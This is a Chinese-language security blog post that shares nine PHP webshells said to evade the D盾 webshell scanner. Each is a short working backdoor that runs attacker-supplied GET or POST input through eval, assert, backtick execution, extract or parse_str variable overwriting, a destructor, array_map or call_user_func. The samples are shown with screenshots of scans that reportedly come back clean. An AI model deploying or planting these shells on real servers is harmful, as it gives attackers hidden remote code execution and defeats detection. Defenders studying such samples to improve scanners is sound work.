# 过D盾webshell分享

## **0x00 前言**

最近在测试过程中遇到了D盾，悲催的发现所有过D盾的webshell都被查杀了。因此就在网上搜索了一些之前可以过D盾的shell，然后将其做了一些变形（有一些shell没有更改），使其可以过D盾。本次一共奉献上9个可过D盾的shell，全部亲测可过。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122204613-b3a5f794-1e43-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122204843-0ca7b9fe-1e44-1.png)

## **0x01 extract 变量覆盖过D盾**

```text
<?php  $a=1;$b=$_POST;extract($b);print_r(`$a`)?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122205019-45fd4624-1e44-1.png)

## **0x02 parse\_str 变量覆盖过D盾**

```text
<?php  $a=1;$b="a=".$_GET['a'];parse_str($b);print_r(`$a`)?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122205139-75f68bc4-1e44-1.png)

## **0x03 \_\_destruct 析构函数过D盾**

```text
<?php 

class User
{
  public $name = '';

  function __destruct(){
    eval("$this->name");
  }
}

$user = new User;
$user->name = ''.$_POST['name'];
?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122205332-b93e808a-1e44-1.png)

## **0x04 null 拼接过D盾**

```text
<?php

$name = $_GET['name'];

$name1=$name2= null;

eval($name1.$name2.$name);

?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122205456-eb31176a-1e44-1.png)

## **0x05 '' 拼接过D盾**

```text
<?php

$name = $_GET['name'];

$name1=$name2= '';

eval($name1.$name2.$name);

?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122205654-31717666-1e45-1.png)

## **0x06 '' null 拼接过D盾**

```text
<?php
$a = $_GET['a'];
$c = null;
eval(''.$c.$a);

?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122205813-609b9c82-1e45-1.png)

## **0x07 array\_map函数过D盾**

```text
<?php
function user()
{
$a123 =  chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);
return ''.$a123;
}
$a123 = user();
$x123 =array($_GET['x']);
array_map($a123,$a123 = $x123 );
?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122210048-bd5033a2-1e45-1.png)

## **0x08 call\_user\_func\_array函数过D盾**

```text
<?php

function a(){
     return 'assert';
}
$a=a();
$aa = array($_GET['x']);
call_user_func_array($a,$a=$aa);
?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122210154-e4267694-1e45-1.png)

## **0x09 call\_user\_func函数过D盾**

```text
<?php
function a(){
     return 'assert';
}
$a=a();
$aa=$_GET['x'];
call_user_func($a,$a=$aa);
?>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190122210308-10a09592-1e46-1.png)

